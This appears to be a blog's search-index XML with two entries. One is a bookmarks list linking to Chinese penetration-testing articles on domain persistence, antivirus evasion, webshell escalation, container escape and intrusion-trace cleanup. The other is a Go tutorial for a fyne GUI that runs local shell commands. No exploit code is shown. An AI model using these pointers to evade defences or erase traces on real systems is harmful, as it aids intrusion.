<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>收藏的文章</title>
    <url>/2099/01/01/%E6%94%B6%E8%97%8F%E7%9A%84%E6%96%87%E7%AB%A0/</url>
    <content><![CDATA[<hr><ul>
<li>未来一定很美好！请继续加油！</li>
</ul><a id="more"></a>

<hr>
<hr>
<hr>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&mid=2247484190&idx=1&sn=049bd6024b68d5f784da6f4666eab62d&chksm=9aced381adb95a97df3846e7f1b1f06d9ddfe2a8c7ece77f6398da5d414375e18021e35073e7&mpshare=1&scene=1&srcid=&sharer_sharetime=1573351062520&sharer_shareid=874f55ea1fe20d98c42c56d295fd3103&key=5755ace7bbc19e498d09038a9c097dc8ba07cd870c05a3d4e20fecb90c62f0bf2fc3dd6118c3d710cace6ccc4a0ee95a2da81e5353d0111db27cb5772bb2d683f9bcb8e27620ebc66e1281fae2a690da&ascene=1&uin=MTAyNzk4MzMyNA%3D%3D&devicetype=Windows+10&version=62070158&lang=zh_CN&pass_ticket=8sY4poyaTvWQPn3fer99trPTEiMV%2BthFTSVyol1UcyDhdSmGcv1pdJQUG0VcJ3vi" target="_blank" rel="noopener">2019年渗透测试思路及面试问题集锦</a></p>
<blockquote>
<p>微信公众号：乌云安全，作者：王大佬</p>
</blockquote>
<p><a href="https://www.freebuf.com/articles/others-articles/207347.html" target="_blank" rel="noopener">OSCP认证经验分享</a></p>
<blockquote>
<p>平台：FreeBUF，作者：daxin09</p>
</blockquote>
<p><a href="https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E7%BB%B4%E6%9D%83.html" target="_blank" rel="noopener">域渗透-域维权</a></p>
<blockquote>
<p>作者：uknow</p>
</blockquote>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzU1NjgzOTAyMg==&mid=2247485289&idx=1&sn=5eb0086d0512c20142a7f9d3799149a4&chksm=fc3fbe68cb48377eda2856487d234d15b7ce2997f7dd82cd07453b1d8d946161e8d5f655655f&mpshare=1&scene=1&srcid=&sharer_sharetime=1569889801299&sharer_shareid=874f55ea1fe20d98c42c56d295fd3103&key=5755ace7bbc19e49b3afdbb8409b1faf7ad84dfb18660d585d1c6d21ba3654ffef76852cddfec62e241837e5160d13038d7bc9781fa85c2e669733aac38bf2a0e338a07d0caa999e523b5513d939405f&ascene=1&uin=MTAyNzk4MzMyNA%3D%3D&devicetype=Windows+10&version=62070136&lang=zh_CN&pass_ticket=WLc2latOSjBN9%2BPOwM1ZKVyjOnkCYBq%2BQtm8ta%2Bg4dqLRWBCgLLZ8RCCN7DBZKGz" target="_blank" rel="noopener">从webshell到域控实战详解</a></p>
<blockquote>
<p>微信公众号：Ms08067安全实验室，作者：徐哥</p>
</blockquote>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&mid=2448904307&idx=1&sn=2bc6e7d98b027ee1ec1d6ea84e559c8f&chksm=8b55c02ebc22493835408d3975801d62631c432bc21a3753fb3b1d5f87847e82f2a7aeccf55c&mpshare=1&scene=1&srcid=&sharer_sharetime=1569679047672&sharer_shareid=874f55ea1fe20d98c42c56d295fd3103&key=c5d0e961d64e3b92378db2d502c63b30021a483ae85f93ae25d8e3a5275866c0b55d76c83e26a869773fb331a8643290dd5e8d476793ec1b5d66779f12de273c5d606d6976967ce53f51260634a92ac4&ascene=1&uin=MTAyNzk4MzMyNA%3D%3D&devicetype=Windows+10&version=62070136&lang=zh_CN&pass_ticket=Q0nBQ98scPPD%2BPBAqUMCKFt0NkIxsnzptV%2B1ROWhVbqCfzmPdC9yFVxMlPx8OTwa" target="_blank" rel="noopener">三大渗透框架权限维持</a></p>
<blockquote>
<p>微信公众号：Bypass，作者：Bypass</p>
</blockquote>
<p><a href="https://boombao.net/2019/09/23/domain-1/" target="_blank" rel="noopener">域渗透常用姿势总结</a></p>
<blockquote>
<p>作者：tkcharlotte</p>
</blockquote>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzIzNzA4NDk3Nw==&mid=2457738181&idx=1&sn=0a204aa85ef7db1df0ff93c178121315&chksm=ff44b39bc8333a8d14adcec4df4c2bd305d67e0711526ade76f54d37a573e8d37efc0c4b64f6&mpshare=1&scene=1&srcid=&sharer_sharetime=1569505276980&sharer_shareid=874f55ea1fe20d98c42c56d295fd3103&key=5755ace7bbc19e493c02ad008cfda80cfeb2e6b3cae5b8936a17a78454a0241edb0e090cc5c1a709bb17e18ada801174c62ba37c68a939e84e46c6577b272500e06bdf549b961fb195b3499a2968afa6&ascene=1&uin=MTAyNzk4MzMyNA%3D%3D&devicetype=Windows+10&version=62070136&lang=zh_CN&pass_ticket=et5EKPmof18jrbkqqbHeORNYyzOECHuXoS4nCyOLaZhpsfLpziLGlIyQUUKQd8FD" target="_blank" rel="noopener">利用 GitHub 从零开始搭建一个博客
</a></p>
<blockquote>
<p>微信公众号：进击的Coder，作者：崔庆才</p>
</blockquote>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247487887&idx=1&sn=d177572cbfda0b2b3eb5667b7fecb7dd&chksm=ec1f44b0db68cda69f6851fe3675761b2ce29093fe96ad2142517da6cb67c744a3ad460d5424&mpshare=1&scene=1&srcid=&sharer_sharetime=1573085650838&sharer_shareid=874f55ea1fe20d98c42c56d295fd3103&key=effb0e3770c8d430cce2754c0200cd7b3c634c3ad9e6577bbe3858b15b178a259a92d3eef27d99ecf350c800aa19d2cde2c31f00b7d07bbe36c94d2399a9e0fb98d7f097777c47f4c56e9f4463b8f8a3&ascene=1&uin=MTAyNzk4MzMyNA%3D%3D&devicetype=Windows+10&version=62070152&lang=zh_CN&pass_ticket=Wrrno%2FGS%2BBrnVdd8xI7Chw5RRX4WAkYkL47%2FNg0hVGw24NSQEFHyogjGnE24BML6" target="_blank" rel="noopener">Getshell | 文件上传绕过整理
</a></p>
<blockquote>
<p>微信公众号：HACK学习呀，作者：HACK学习</p>
</blockquote>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&mid=2448904504&idx=1&sn=7d2f52db49bea8c405bf8c4d7ac9b9f0&chksm=8b55c165bc224873b82899b62e19f20f51333e88e650162240a05717c3affba5331ff8040eda&mpshare=1&scene=1&srcid=&sharer_sharetime=1574210780916&sharer_shareid=874f55ea1fe20d98c42c56d295fd3103&key=b15bf15257b0c0df46a240a7c337dac32f59428673a78763f044052d7d53147ab634515a3a73f9ffd3d80d598525da916a750ac2ccf99db5c4797bdf150f09f65507e8e49041b4a5aabd65a553938088&ascene=1&uin=MTAyNzk4MzMyNA%3D%3D&devicetype=Windows+10&version=62070158&lang=zh_CN&pass_ticket=1xM7HQbZfvaE0QJAIF%2F6thDuKDNMCkdxnYB7UlI2IyOvDCqmMhzw%2Bvnj1hxkVxhL" target="_blank" rel="noopener">如何使用Python进行Payload免杀</a></p>
<blockquote>
<p>微信公众号：Bypass，作者：Bypass</p>
</blockquote>
<p><a href="https://www.hackinn.com/index.php/archives/672/" target="_blank" rel="noopener">微信小程序的渗透五脉</a></p>
<blockquote>
<p>作者：雷神众测、Poc sir</p>
</blockquote>
<p><a href="https://mp.weixin.qq.com/s/OGiDm3IHBP3_g0AOIHGCKA" target="_blank" rel="noopener">红蓝对抗之Windows内网渗透</a></p>
<blockquote>
<p>微信公众号：腾讯安全应急响应中心    作者：jumbo@腾讯蓝军</p>
</blockquote>
<p><a href="https://uknowsec.cn/posts/notes/DLL%E5%8A%AB%E6%8C%81+%E9%87%8D%E6%96%B0%E5%88%B6%E4%BD%9C%E5%AE%89%E8%A3%85%E5%8C%85%E5%9C%A8%E9%92%93%E9%B1%BC%E4%B8%8E%E5%8F%8D%E9%92%93%E9%B1%BC%E7%9A%84%E5%88%A9%E7%94%A8.html" target="_blank" rel="noopener">DLL劫持+重新制作安装包在钓鱼与反钓鱼的利用</a></p>
<blockquote>
<p>作者：uknow</p>
</blockquote>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&mid=2448905800&idx=1&sn=939d69d7ce687e464a5def184b694ad2&chksm=8b55c615bc224f032ff829ec73acdbf3b5c052afd5ddbf7e40ccd2abdf5bc977851109d93cd4&mpshare=1&scene=1&srcid=0803ZsCT5VecId5WQczfBep7&sharer_sharetime=1596413012146&sharer_shareid=874f55ea1fe20d98c42c56d295fd3103&key=3802bbcd5b9ad3c8d41b27f734a8d394657197c7967d957bcd55aedf07b9191c290256102867779bb91ff0b7cd8b556f29d6cd2374bfd8258e0f1e5bbdde6d2695229763c6bb5f5a6b91b3b82deef19d&ascene=1&uin=MTAyNzk4MzMyNA%3D%3D&devicetype=Windows+10+x64&version=62090529&lang=zh_CN&exportkey=AZ912jy2FCCohzjjIBO9Wuw%3D&pass_ticket=qpD3B%2BK0T2YmUQapjlVQUEEkDBnLAtxWL0l0i8nH9tCnCjJumgDcadcSopGe%2BNRv" target="_blank" rel="noopener">技术干货 | Docker 容器逃逸案例汇集</a></p>
<blockquote>
<p>微信公众号：Bypass，作者：Bypass</p>
</blockquote>
<p><a href="https://mp.weixin.qq.com/s/Ax5cBvP6kxKHeJOy8u0Ckg" target="_blank" rel="noopener">如何在目标内网中快速定位 “出网机”</a></p>
<blockquote>
<p>微信公众号：红队攻防揭秘，作者：klion</p>
</blockquote>
<p><a href="https://mp.weixin.qq.com/s/hXUjPXsh85nd8OL_IlYjZg" target="_blank" rel="noopener">无需密码 直连目标内网Mssql</a></p>
<blockquote>
<p>微信公众号：红队攻防揭秘，作者：klion</p>
</blockquote>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzI2OTMzNjg4OQ==&mid=2247485459&idx=1&sn=a847d2d7d510c1120e178b5b7edf10d5&chksm=eae0a045dd972953de7dffa611b7a24a9d11d68394c5a54dd578beaa04fa2931044ed966fc18&mpshare=1&scene=1&srcid=&sharer_sharetime=1590881605650&sharer_shareid=874f55ea1fe20d98c42c56d295fd3103&key=8fbad325b276a667dd033b189fa405ace2e932821dccedf78a225a3f63995cbe4b63d047812c6f3f7160755baec656f02dd40fe3e3f88d7881fd216b438108c352f361517f517f7d84cbfb8f31cd26f7&ascene=1&uin=MTAyNzk4MzMyNA%3D%3D&devicetype=Windows+10+x64&version=62090070&lang=zh_CN&exportkey=ARanimSna%2Ba3v2KxS04INxM%3D&pass_ticket=GRDc74jpVfAP72%2BXgbzg%2FnLlG9BPDQS5D4uVhjK7Bh3iOpUH21hqRtcPN14OJPda" target="_blank" rel="noopener">利用Python反序列化运行加载器实现免杀</a></p>
<blockquote>
<p>微信公众号：洛米唯熊</p>
</blockquote>
<p><a href="https://github.com/TideSec/BypassAntiVirus" target="_blank" rel="noopener">远控免杀文章汇总</a></p>
<blockquote>
<p>作者：TideSec</p>
</blockquote>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzI2NDk0MTM5MQ==&mid=2247483689&idx=1&sn=1d83538cebbe2197c44b9e5cc9a7997f&chksm=eaa5bb09ddd2321fc6bc838bc5e996add511eb7875faec2a7fde133c13a5f0107e699d47840c&mpshare=1&scene=1&srcid=&sharer_sharetime=1588389777272&sharer_shareid=7165ca7c73648a1b40a8a6972f579a5c&key=3abf2fc9c1ee614f4795896108cf369b0c8e383968115aaf6f2b12d5104625e9f286d34aa089ca2c2cd17d78d60154a099de311616300567ce4059eeb3f1da4f067f3c4b57efb67e3cf471d2d63a2c37&ascene=1&uin=MTAyNzk4MzMyNA%3D%3D&devicetype=Windows+10+x64&version=6209005f&lang=zh_CN&exportkey=AWHv1ezb6QcSjQ%2B7v8vOroE%3D&pass_ticket=l4Z%2B6itNXljY1lQpDzxIclTHAj3WDMy%2FLvsvtGZ3ktQk1y6MFZvHV%2FiupqiSabhf" target="_blank" rel="noopener">微软不认的“0day”之域内本地提权-烂番茄（Rotten Tomato）</a></p>
<blockquote>
<p>微信公众号：奇安信ATEAM，作者：n0thing</p>
</blockquote>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzU2MjM4NDYxOQ==&mid=2247486960&idx=1&sn=073ac478eb04535125ce9797ed43c299&chksm=fc6b1674cb1c9f6233dae21fbca3e5711444a8906381fba81fb83a635d759ebf36e4cb6151b8&mpshare=1&scene=1&srcid=08283YlqVbKm1c8KaCzX9CpD&sharer_sharetime=1598609763987&sharer_shareid=874f55ea1fe20d98c42c56d295fd3103&key=8bc8ac599537b08577991b7b00b97d72bb8a522005f8f01bf263b6deaa3a348c0bbda144a782d5d6821be3f6c57d5af80da88dbb3737a160231a47f5efdad294285383774a86ebd1a45fa8658a1cd983a8d4d324af6d1199ab7eaf149233894e0eb87d79fdcb79ac4c44831ab97404dc08bcde5f1af9a2b1797a4554c87e9948&ascene=1&uin=MTAyNzk4MzMyNA%3D%3D&devicetype=Windows+10+x64&version=62090529&lang=zh_CN&exportkey=Aec0jZaIewPrfDheAsUYL%2BU%3D&pass_ticket=Ox7LqIi4kGybK1B1LSvRSB5jZwXQrIb%2BjsulgsjCzGgPXnGSA7KyGrVUMpTWfnPG" target="_blank" rel="noopener">Android渗透工具集合</a></p>
<blockquote>
<p>微信公众号：重生信息安全</p>
</blockquote>
<p><a href="https://mp.weixin.qq.com/s/8lcdEVty30rMw7Jy6WpeBg" target="_blank" rel="noopener">HW｜蓝队实战溯源反制手册分享</a></p>
<blockquote>
<p>微信公众号：Timeline Sec，作者：璠淳</p>
</blockquote>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&mid=2247486903&idx=1&sn=f1e229b0d8fc357f2fdd7c7f40716165&chksm=9b392b06ac4ea210adc1f5a8a8f25542d2020eb13840fc06ac2663fb80d9df2380f5b0be0e2e&mpshare=1&scene=1&srcid=0908V7Hvsq8Aup1gIDqKm6JB&sharer_sharetime=1599577208531&sharer_shareid=874f55ea1fe20d98c42c56d295fd3103&key=3802bbcd5b9ad3c86ed86edc1f569ea82e82e6cf1293cef6ac8bfee4f057231527e8a96c22615ee4fa9d660e8b6dca77e12791c76c613b0161ef3aa00327fbe5501f0ef7e7201cfeeb8f267c13738b734c30f79a36e9e1214eaafb701114df13bf67bb533b6af352a415b449589baf38ea94a31898dc92d54295b8b4f820fbbd&ascene=1&uin=MTAyNzk4MzMyNA%3D%3D&devicetype=Windows+10+x64&version=62090529&lang=zh_CN&exportkey=AewYOqa%2BbNhmdBkSD%2Fr7lBQ%3D&pass_ticket=0WfANKKRglrYJk3gjH0HOaM5XNsF8aM7hQF3G6YgeQQgV24m7zQJJ%2BJgum859Was&wx_header=0" target="_blank" rel="noopener">记一次红蓝对抗中钓鱼的应用</a></p>
<blockquote>
<p>微信公众号：酒仙桥六号部队，作者：六号刃部</p>
</blockquote>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&mid=2448905971&idx=1&sn=583df1dcc8e899a48402125998f14e7a&chksm=8b55c6aebc224fb8941b0eb02bcc8fa7e9c293ed6ea15ae2f6bd234e4b539d9570d75ea5132e&mpshare=1&scene=1&srcid=0909V4C764VZkdXZeGIpIOob&sharer_sharetime=1599610003782&sharer_shareid=874f55ea1fe20d98c42c56d295fd3103&key=3802bbcd5b9ad3c82d8515da76798f59d430efb963fda4bac9087d87c503dc93aa4963d2f7e1e4984362c2bd9c678ce59652d0ec92a0ec13dbc46292a936de8dfb955c1d8595bd9be52a0771156f3189cb3b14c8d0b4f93e86de3b75e86df6cfcd300c16102a20829f36a7e53d6bcbee89ce850ae0c50927befd6db2cb20f19a&ascene=1&uin=MTAyNzk4MzMyNA%3D%3D&devicetype=Windows+10+x64&version=62090529&lang=zh_CN&exportkey=AYmnGEKSkIgY05HE7C1%2FAVc%3D&pass_ticket=0WfANKKRglrYJk3gjH0HOaM5XNsF8aM7hQF3G6YgeQQgV24m7zQJJ%2BJgum859Was&wx_header=0" target="_blank" rel="noopener">Windows 入侵痕迹清理技巧</a></p>
<blockquote>
<p>微信公众号： Bypass，作者： Bypass</p>
</blockquote>
<p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247483802&idx=1&sn=bd0b61b881a3d833da2719a0a8b241c7&chksm=cfa6a589f8d12c9f6a8592124b6bd49f14357d1b7d78b4a44ff17838199b6e81b13f4becc328&mpshare=1&scene=1&srcid=1010OTMfHOLPrlv3YRxy5kNr&sharer_sharetime=1602307592502&sharer_shareid=874f55ea1fe20d98c42c56d295fd3103&key=3802bbcd5b9ad3c8fe075cb52ec746aee5d4e3cd760f2483c2abac1a37c000026a6ab4448753e06cdd2768bd588f36e0cb704715d3567c0ca00493b299f41eeb0c5c8723a1656cbd3ed58d433fc5b1c8a91a653010535e746c71277567603d1fd9dd13752e3f4cdf51993ef465c28bfdef7dc3dab090cddafca9d4af1d027c96&ascene=1&uin=MTAyNzk4MzMyNA%253D%253D&devicetype=Windows+10+x64&version=6300002f&lang=zh_CN&exportkey=AaECt5gOSkFDFd5VsRIYeGY%253D&pass_ticket=OsMMewKOQjdM1SKAhpE%252BwD2%252Fhdrn9MO8IDecgT4cldD2akGLnoZdCczu9wdlQQG%252B&wx_header=0" target="_blank" rel="noopener">看图识WAF-搜集常见WAF拦截页面</a></p>
<blockquote>
<p>微信公众号： 潇湘信安，作者： 3had0w</p>
</blockquote>
]]></content>
      <tags>
        <tag>收藏</tag>
      </tags>
  </entry>
  <entry>
    <title>GO语言开发自制小工具框架</title>
    <url>/2021/08/16/GO%E8%AF%AD%E8%A8%80%E5%BC%80%E5%8F%91%E8%87%AA%E5%88%B6%E5%B0%8F%E5%B7%A5%E5%85%B7%E6%A1%86%E6%9E%B6/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>接上一篇使用fyne解决GUI库中文问题之后，打算落地些小工具来提升实战中的需求。本文以执行本地命令为引子探究fyne库的使用方式。<br></p><a id="more"></a>
<h3 id="一：优化后的中文问题"><a href="#一：优化后的中文问题" class="headerlink" title="一：优化后的中文问题"></a>一：优化后的中文问题</h3><p>上一篇中最后思考部分中提到的解决方式在本文中得以实践，发现该方法确实要比编译二进制到程序中快捷简便的多。<br></p>
<blockquote>
<p>写完这篇文章的时候突然想到可以根据第一种方法的扩展，那就是先找好win、mac、linux等自己需要跨平台系统上字体文件的具体路径，然后使用runtime.GOOS判断操作系统类型，根据类型调用相应的字体文件来达到不需要将字体文件编译进程序即可正常显示中文字体的目的，并且还减少了因字体文件过大导致程序也相应过大的问题。</p>
</blockquote>
<p><br>完整代码如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">sysType := runtime.GOOS</span><br><span class="line">	<span class="keyword">switch</span> sysType &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">"darwin"</span>:</span><br><span class="line">		fmt.Printf(<span class="string">"当前操作系统为: %s，自动替换字体文件\n"</span>, sysType)</span><br><span class="line">		os.Setenv(<span class="string">"FYNE_FONT"</span>, <span class="string">"/System/Library/Fonts/STHeiti Medium.ttc"</span>) <span class="comment">//设置mac字体环境</span></span><br><span class="line">	<span class="keyword">case</span> <span class="string">"windows"</span>:</span><br><span class="line">		fmt.Printf(<span class="string">"当前操作系统为: %s，自动替换字体文件\n"</span>, sysType)</span><br><span class="line">		os.Setenv(<span class="string">"FYNE_FONT"</span>, <span class="string">"C:\\Windows\\Fonts\\simhei.ttf"</span>) <span class="comment">//设置win字体环境</span></span><br><span class="line">	<span class="keyword">case</span> <span class="string">"linux"</span>:</span><br><span class="line">		fmt.Printf(<span class="string">"当前操作系统为: %s，自动替换字体文件\n"</span>, sysType)</span><br><span class="line">		<span class="comment">//os.Setenv("FYNE_FONT", "linux上字体路径") //设置linux字体环境，暂时没找字体，等以后在找</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> os.Unsetenv(<span class="string">"FYNE_FONT"</span>)           <span class="comment">//取消环境变量</span></span><br></pre></td></tr></table></figure>
<p>使用switch语句将runtime.GOOS判断出操作系统的类型进行划分，再将提前找好的对应字体文件设置为环境变量，最后的defer语句作为延迟执行取消环境变量。该处fmt.Printf会在终端中打印出提示信息，在实际使用过程中可注释该句。</p>
<h3 id="二：总框架设计"><a href="#二：总框架设计" class="headerlink" title="二：总框架设计"></a>二：总框架设计</h3><p>fyne的使用需要先创建应用程序对象和窗口对象，如下代码所示前两行。随后调用整体框架的GUI界面，考虑以后可能需要多种窗口界面，这里我放到了另外一个LoadUI函数中。最后3行是对窗体的已经基本设置，可自行更改。<br>代码如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">myapp := app.New()                       <span class="comment">//应用程序对象</span></span><br><span class="line">mywin := myapp.NewWindow(<span class="string">"测试版"</span>) <span class="comment">//创建窗口对象,标题</span></span><br><span class="line"></span><br><span class="line">window.LoadUI(mywin)</span><br><span class="line"></span><br><span class="line">mywin.Resize(fyne.NewSize(<span class="number">1000</span>, <span class="number">600</span>)) <span class="comment">//设置初始窗体大小</span></span><br><span class="line">mywin.CenterOnScreen() <span class="comment">//设置中心位置</span></span><br><span class="line">mywin.ShowAndRun()                    <span class="comment">//运行程序</span></span><br></pre></td></tr></table></figure>
<p>在LoadUI中，使用了最为方便的AppTabs（选项卡）方法来设计窗体样式。其结构体如下所示</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// AppTabs container is used to split your application into various different areas identified by tabs.</span></span><br><span class="line"><span class="comment">// The tabs contain text and/or an icon and allow the user to switch between the content specified in each TabItem.</span></span><br><span class="line"><span class="comment">// Each item is represented by a button at the edge of the container.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Since: 1.4</span></span><br><span class="line"><span class="keyword">type</span> AppTabs <span class="keyword">struct</span> &#123;</span><br><span class="line">	widget.BaseWidget</span><br><span class="line"></span><br><span class="line">	Items           []*TabItem</span><br><span class="line">	OnChanged       <span class="function"><span class="keyword">func</span><span class="params">(tab *TabItem)</span></span></span><br><span class="line">	current         <span class="keyword">int</span></span><br><span class="line">	tabLocation     TabLocation</span><br><span class="line">	isTransitioning <span class="keyword">bool</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>






<p>本文中只需要用到Items和OnChanged来标注tab名称和对应事件。其样式如下：<br><img src="https://i.loli.net/2021/08/16/2N7woqrpdWPSu6R.png" alt="image.png"><br>代码如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//总窗体设计，让main调用加载</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">LoadUI</span><span class="params">(mywin fyne.Window)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">////页面布局</span></span><br><span class="line">	content := container.NewAppTabs(container.NewTabItem(<span class="string">"命令执行"</span>, execUI(mywin)),</span><br><span class="line">		container.NewTabItem(<span class="string">"1"</span>, loginBtn1),<span class="comment">//以下占位，可忽略</span></span><br><span class="line">		container.NewTabItem(<span class="string">"2"</span>, loginBtn2),</span><br><span class="line">		container.NewTabItem(<span class="string">"3"</span>, nameBox),</span><br><span class="line">		container.NewTabItem(<span class="string">"4"</span>, Display),</span><br><span class="line">	)</span><br><span class="line">	mywin.SetContent(content)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在第一个tab中命名为”命令执行”，并且使用execUI函数来载入选项卡内的界面。<br></p>
<h3 id="三：命令执行模块界面设计"><a href="#三：命令执行模块界面设计" class="headerlink" title="三：命令执行模块界面设计"></a>三：命令执行模块界面设计</h3><p>fyne的界面设计就像洋葱一样一层套一层。上面设计完框架整体的UI界面，接下来就需要对每一个选项卡里的界面进行设计。<br>这里创建了一个单行文本框cmdin := widget.NewEntry()作为命令输入框，并且使用SetPlaceHolder()来设置只读属性的提示信息。<br>然后创建了一个多行文本框cmdout := widget.NewMultiLineEntry()作为命令输出显示框，并且使用fyne.TextWrapWord属性将超出窗体最大宽度的文本内容可以用垂直滚动条来展示。<br>该处设计原本是使用label标签来显示的，但是后面发现执行一条ifconfig命令变将整个窗口撑出了屏幕之外，体验十分不好，且影响使用。后经过查找多方资料和看fyne源码才找到了现在的这种方法。<br>最后创建了一个响应单击事件的执行命令按钮cmdbtn := widget.NewButton()。在按钮中需要传入两个参数，一个是该按钮的显示名称和一个单击事件函数，如下代码所示：<br>在单击事件的匿名函数中调用了command.ExecForSys()，该函数接收cmdin中的文本作为命令执行并将结果输出（后面会介绍该函数）。随后cmdout.SetText(output)将输出的结果显示到cmdout中。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">execUI</span><span class="params">(mywin fyne.Window)</span> <span class="title">fyne</span>.<span class="title">CanvasObject</span></span> &#123;</span><br><span class="line">	<span class="comment">////命令执行模块</span></span><br><span class="line">	cmdin := widget.NewEntry()</span><br><span class="line">	cmdin.SetPlaceHolder(<span class="string">"commands"</span>)</span><br><span class="line">    </span><br><span class="line">	cmdout := widget.NewMultiLineEntry()</span><br><span class="line">	cmdout.Wrapping = fyne.TextWrapWord</span><br><span class="line">    </span><br><span class="line">	cmdbtn := widget.NewButton(<span class="string">"执行"</span>, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		output := command.ExecForSys(cmdin.Text)</span><br><span class="line">		cmdout.SetText(output)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//将按钮和输入框设置在同一行,设置按钮最小大小在右边，输入框自动填充</span></span><br><span class="line">	oneline := fyne.NewContainerWithLayout(layout.NewBorderLayout(<span class="literal">nil</span>, <span class="literal">nil</span>, <span class="literal">nil</span>, cmdbtn), cmdin, cmdbtn)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//设置oneline位置最小大小在上，输出框自动填充</span></span><br><span class="line">	<span class="keyword">return</span> fyne.NewContainerWithLayout(layout.NewBorderLayout(oneline, <span class="literal">nil</span>, <span class="literal">nil</span>, <span class="literal">nil</span>), oneline, cmdout)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>oneline这句<br>layout.NewBorderLayout()函数使得传入的控件放入上、下、左、右位置，并且将其他未传入的控件自动延展满整个布局。使用该函数可以将命令输入的单行文本框cmdin和按钮控件cmdbtn放在同一布局，并且将cmdbtn该布局的最右边，而左侧单行文本框则自动拉伸。<br>所得到的样式如下：<br><img src="https://i.loli.net/2021/08/16/Fevx2q4OBQaoW9u.png" alt="image-1.png"><br>如不使用的话，就会每个控件单独一行，如下所示：<br><img src="https://i.loli.net/2021/08/16/1scNphjBr837Wlx.png" alt="image-2.png"><br>最后返回了一个整体布局，在return中，将单行文本框cmdin和按钮控件cmdbtn作为一个整体，与显示结果的多行文本框cmdout进行上下排列。<br>整体样式如下：<br><img src="https://i.loli.net/2021/08/16/f7CxTukVQNzivnB.png" alt="image-3.png"></p>
<h3 id="四：执行命令功能的实现"><a href="#四：执行命令功能的实现" class="headerlink" title="四：执行命令功能的实现"></a>四：执行命令功能的实现</h3><p>上面做好整体的样式布局，剩下的就实现command.ExecForSys()函数的功能即可。<br>因为不同的操作系统命令有所不同，所以这里还是使用runtime.GOOS来判断系统类型，如下代码所示：<br>fallthrough用来强制执行后面的case中的代码，即macOS执行与linux同样一套代码。<br>另外在实验windows的时候，发现如果没有使用chcp 65001编码，那么输出的结果将会导致程序溢出而崩溃。<br>将传入的命令拼接好在使用exec.Command执行命令再将标准输出return.</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">osExec</span><span class="params">(cmdin <span class="keyword">string</span>)</span> <span class="params">(output <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> cmds []<span class="keyword">string</span></span><br><span class="line">	cmdinPrefix := <span class="string">""</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> runtime.GOOS &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">"darwin"</span>:</span><br><span class="line">		<span class="keyword">fallthrough</span></span><br><span class="line">	<span class="keyword">case</span> <span class="string">"linux"</span>:</span><br><span class="line">		cmds = <span class="built_in">append</span>(cmds, <span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>)</span><br><span class="line">	<span class="keyword">case</span> <span class="string">"windows"</span>:</span><br><span class="line">		cmds = <span class="built_in">append</span>(cmds, <span class="string">"cmd"</span>, <span class="string">"/c"</span>)</span><br><span class="line">		cmdinPrefix = <span class="string">"chcp 65001 &amp;&amp; "</span></span><br><span class="line">	&#125;</span><br><span class="line">	cmds = <span class="built_in">append</span>(cmds, cmdinPrefix+cmdin)</span><br><span class="line">	c := exec.Command(cmds[<span class="number">0</span>], cmds[<span class="number">1</span>:]...)</span><br><span class="line">	<span class="comment">// 获取输出对象，可以从该对象中读取输出结果</span></span><br><span class="line">	stdout, err := c.StdoutPipe()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 运行命令</span></span><br><span class="line">	<span class="keyword">if</span> err := c.Start(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">	&#125;</span><br><span class="line">	outputBytes, _ := ioutil.ReadAll(stdout)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">string</span>(outputBytes)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数大体结构如此。command包的完整代码如下，即添加了一下置顶的tips。然后合并了tips()和osExec()输出。</p>
